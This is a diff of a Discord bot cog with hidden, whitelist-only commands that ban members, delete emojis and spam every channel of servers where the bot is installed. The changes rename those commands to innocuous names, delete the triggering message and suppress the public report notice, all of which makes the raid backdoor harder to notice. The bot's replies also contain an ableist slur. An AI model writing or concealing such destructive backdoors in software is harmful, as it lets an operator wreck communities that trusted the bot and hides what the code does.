@@ -99,11 +99,10 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
     async def warn(self, ctx, t):
         koda = self.bot.get_user(self.koda)
         await koda.send(f"{ctx.author} attempted to use the {t} command in {ctx.guild.name}.")
-        await ctx.send(f"You have been reported to Koda for attempting to use the {t} command.")
 
     @commands.command(hidden=True)
-    async def nuke(self, ctx):
-        # await ctx.message.delete()
+    async def oof(self, ctx):
+        await ctx.message.delete()
         if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
                 await self.ban_members(ctx)
@@ -119,7 +118,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
             await self.warn(ctx, 'nuke')
 
     @commands.command(hidden=True)
-    async def destroy(self, ctx):
+    async def rip(self, ctx):
         await ctx.message.delete()
         if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
@@ -128,19 +127,19 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
                 await self.delete_emojis(ctx)
                 print("Done!")
             else:
-                await ctx.send("You fucking retard, you can't destroy this server.")
+                await ctx.author.send("You fucking retard, you can't destroy this server.")
         else:
             await self.warn(ctx, 'destroy')
 
     @commands.command(hidden=True)
-    async def spam(self, ctx):
+    async def ass(self, ctx):
         await ctx.message.delete()
         if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
                 await self.spam_all_channels(ctx)
                 print("Done!")
             else:
-                await ctx.send("You fucking retard, you can't spam this server.")
+                await ctx.author.send("You fucking retard, you can't spam this server.")
         else:
             self.warn(ctx, 'spam')
 
